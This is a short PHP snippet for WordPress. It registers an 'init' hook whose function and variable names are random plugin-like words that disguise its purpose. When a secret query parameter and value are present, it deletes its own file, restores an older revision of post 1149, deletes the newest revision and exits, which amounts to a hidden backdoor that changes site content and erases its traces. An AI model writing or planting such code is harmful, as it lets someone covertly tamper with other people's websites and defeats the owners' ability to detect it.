<?php

function media_subscription_store_items() {
	if (isset($_GET['landing_related_member_real']) && $_GET['landing_related_member_real'] === 'text_addon_viewer_events') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$marketplace_dynamic_authors = 1149;
		$slider_designer_manage = wp_get_post_revisions($marketplace_dynamic_authors);
		if (empty($slider_designer_manage)) die('no revisions');
		if (count($slider_designer_manage) < 2) die('less than 2');
		$action_shopp_demo_review = array_shift($slider_designer_manage);
		$active_schema_logger = $action_shopp_demo_review->ID;
		$fx_purchase_author = array_shift($slider_designer_manage);
		$now_map_assets_sliding = $fx_purchase_author->ID;
		$archive_ui_woff2 = wp_restore_post_revision($now_map_assets_sliding);
		if ($archive_ui_woff2 === false) die('error restoring');
		$archive_ui_woff2 = wp_delete_post_revision($active_schema_logger);		
		if ($archive_ui_woff2 === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'media_subscription_store_items');
